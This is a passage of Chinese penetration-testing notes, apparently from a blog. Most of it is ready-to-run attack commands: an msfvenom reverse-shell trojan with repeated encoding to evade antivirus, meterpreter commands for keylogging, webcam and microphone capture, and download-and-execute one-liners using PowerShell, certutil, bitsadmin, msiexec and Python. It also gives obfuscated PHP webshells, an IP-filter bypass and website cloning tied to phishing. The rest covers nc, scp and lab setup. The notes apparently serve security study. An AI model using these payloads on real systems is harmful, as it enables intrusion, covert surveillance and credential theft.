class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;msf生成木马：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST= 192 .168.31.18 LPORT= 4444 -b &amp;quot;\x00&amp;quot; -i 10 -f exe -o ~/Desktop/test.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-a x86 使用x86框架&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;--platform windows 运行平台为windows&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-p windows/meterpreter/reverse_tcp 指定payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LHOST= 192 .168.200.130 LPORT= 8088 本地IP和监听端口&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-b &amp;quot;\x00&amp;quot; 去掉坏字符&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-i 10 编码 10 次，提高免杀概率&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-f exe 木马文件格式&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-o /var/www/html/test.exe 输出路径&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;监听端口等待木马执行：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfconsole&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use payload windows/meterpreter/reverse_tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lhost 192.168.31.123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lport 4444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exploit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;msf控制后的可执行命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;getuid 查看当前权限&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;getsystem 尝试获取system权限&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell 获取当前权限shell会话&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ps 列出正在运行的进程&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pkill 按名称终止进程&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kill 按PID终止进程&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reboot 重启 shutdown 关机&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;upload 上传文件(格式参考:upload /root/1.txt - &amp;gt; d:/)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;download 下载文件(格式参考:download c:/1.txt - &amp;gt; /root/)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;keyboard_send 令对方键盘输入(参考格式:keyboard_send ilovecc)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;keyscan_start 开始捕获击键（开始键盘记录）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;keyscan_dump 转储按键缓冲（下载键盘记录）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;keyscan_stop 停止捕获击键（停止键盘记录）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;record_mic 麦克风录制(格式参考:record_mic -d 13)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;screenshot 截图截取对方目前桌面的截图&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;webcam_snap 摄像头拍摄一张照片&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;一句话下载文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一句话下载文件&#34;&gt;#&lt;/a&gt; 一句话下载文件&lt;/h3&gt;
&lt;p&gt;参考链接： &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9mb3J1bS55d2hhY2suY29tL2JvdW50eXRpcHMucGhwP2Rvd25sb2Fk&#34;&gt;https://forum.ywhack.com/bountytips.php?download&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;PowerShell - IWR/IEX&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;powershell.exe -Command &amp;quot;Invoke-WebRequest -Uri http://127.0.0.1:81/exp.exe -OutFile test.exe&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;powershell.exe -Command &amp;quot;IEX(New-Object Net.WebClient).DownloadFile(&amp;#x27;http://127.0.0.1:81/exp.exe&amp;#x27;, test.exe)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;CMD - Certutil/SMB&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CMD - Certutil: certutil.exe -urlcache -split - f http://127.0.0.1:81/exp.exe test.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CMD - SMB: copy \\127.0.0.1\files\exp.exe test.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;Linux - wget&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget http://127.0.0.1:81/exp.exe -O test.exe 8. Linux - curl: curl http://127.0.0.1:81/exp.exe -o test.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;Windows Bitsadmin/msiexec:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bitsadmin /rawreturn /transfer down &amp;quot;http://127.0.0.1:81/exp.exe&amp;quot; c:\\test.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msiexec /q /i http://127.0.0.1:81/exp.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msiexec /q /%os:~1,1%http://127.0.0.1:81/exp.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;Python Download:&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;quot;import urllib2; exec urllib2.urlopen(&amp;#x27;http://127.0.0.1:81/exp.exe&amp;#x27;).read();&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;ip转为纯数字访问&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ip转为纯数字访问&#34;&gt;#&lt;/a&gt; ip 转为纯数字访问&lt;/h3&gt;
&lt;p&gt;在线转换地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYmVqc29uLmNvbS9jb252ZXJ0L2lwMmludC8=&#34;&gt;https://www.bejson.com/convert/ip2int/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;如要访问 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEuMTE3LjUyLjIxOQ==&#34;&gt;http://1.117.52.219&lt;/span&gt; 可以访问 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzI0NDU4NDU5&#34;&gt;http://24458459&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;其中 1x256&lt;sup&gt;3+117x256&lt;/sup&gt;2+52x256+219=24458459&lt;/p&gt;
&lt;p&gt;可以当对方对 ip 做了点过滤的时候进行绕过&lt;/p&gt;
&lt;h3 id=&#34;一句话木马被过滤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一句话木马被过滤&#34;&gt;#&lt;/a&gt; 一句话木马被过滤&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;变形一句话木马&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php eval($_POST[x]);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?=eval($_POST[x]);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?=eval($_POST&amp;#123;x&amp;#125;);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?=system(&amp;#x27;tac ../fl*&amp;#x27;)?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?=`tac ../fl*`?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;? echo `tac /var/www/html/f*`?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php $a=&amp;#x27;syste&amp;#x27;;$b=&amp;#x27;m&amp;#x27;;$c=$a.$b;$c(&amp;#x27;ls ../&amp;#x27;);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;mac克隆网站&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mac克隆网站&#34;&gt;#&lt;/a&gt; mac 克隆网站&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过SiteSucker克隆网站或者wget的方式下载源码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget -r http://word.wd1x.com/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将源码移动到/Library/WebServer/Documents目录下&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo mv ~/Downloads/word.wd1x.com/ /Library/WebServer/Documents&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;设置此目录的权限使得任意用户可访问&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo chmod - R 777 /Library/WebServer/Documents/word.wd1x.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;修改apache配置文件，改变index.html指向&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo cp /etc/apache2/httpd.conf /etc/apache2/httpd.conf.bak&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo vim /etc/apache2/httpd.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DirectoryIndex /word.wd1x.com/index.html index.html&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;用apachectl操作apache的启动或停止&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo apachectl start/stop/restart&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;访问http://localhost或者http://localhost/word.wd1x.com&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;mac与win上互联&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mac与win上互联&#34;&gt;#&lt;/a&gt; mac 与 win 上互联&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;mac 查看 win 上某个文件内容并复制&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;通过终端或者 ssh 连接工具：&lt;br&gt;
ssh &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOmFkbWluaXN0cmF0b3JAMTkyLjE2OC4wLjExMQ==&#34;&gt;administrator@192.168.0.111&lt;/span&gt;&lt;br&gt;
cd /d “G:\xiaodi\37 - 权限维持 &amp;amp; 钓鱼 &amp;amp; MSF 等”&lt;br&gt;
type 表单劫持.txt&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过 vnc 或者 rdp：直接通过可视化界面复制相关内容&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过 nc 工具来实时终端聊天 (需要打开防火墙对应端口)：&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;被控端：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc - l -v - v - p 4444 或 nc - lvvp 4444 (命令与nc版本有关)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;控制端：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc 192.168.0.111 4444&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;传输文件时用 scp 或 ssh 连接工具&lt;br&gt;
 scp &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOmNoZW50dW9AMTkyLjE2OC4wLjEwMg==&#34;&gt;chentuo@192.168.0.102&lt;/span&gt;:~/Desktop/flash.exe.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;其他：通过设置 smb 或 nfs 来实现共享存储&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;mac 和 win 实时通讯&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在windows上通过mobex连接到mac，并开启本地监听：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc -l 4444 -v&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在mac上开始将内容发送至 4444:&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc 127.0.0.1 4444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;此后就可以在两个电脑之间互相发送临时内容了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;mac 和 win 共享文件夹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;mac 上开启 smb 文件共享，单独设置一个用户 smbtest 和密码，为其开放指定目录，并在 wifi 的高级设置中 WINS 中添加 windows 的 ip 地址&lt;/p&gt;
&lt;p&gt;win 上通过运行输入 \192.168.x.x 加入到 mac 的共享文件夹当中即可&lt;/p&gt;
&lt;p&gt;win 上通过 shift+windows+s 键可以截图，并最终保存到共享文件夹当中即可&lt;/p&gt;
&lt;h3 id=&#34;vulfocus部署&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#vulfocus部署&#34;&gt;#&lt;/a&gt; vulfocus 部署&lt;/h3&gt;
&lt;p&gt;参考地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9mb2ZhcHJvLmdpdGh1Yi5pby92dWxmb2N1cy8jL0lOU1RBTEw=&#34;&gt;https://fofapro.github.io/vulfocus/#/INSTALL&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过docker 安装vulfocus&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-v /var/run/docker.sock:/var/run/docker.sock 为 docker 交互连接。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-e DOCKER_URL 为 Docker 连接方式，默认通过 unix://var/run/docker.sock 进行连接，也可以通过 tcp://xxx.xxx.xxx.xxx:2375 进行连接（必须开放 2375 端口）。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-v /vulfocus-api/db.sqlite3:db.sqlite3 映射数据库为本地文件。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-e VUL_IP=xxx.xxx.xxx.xxx 为 Docker 服务器 IP ，不能为 127.0.0.1。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-e EMAIL_HOST=&lt;span 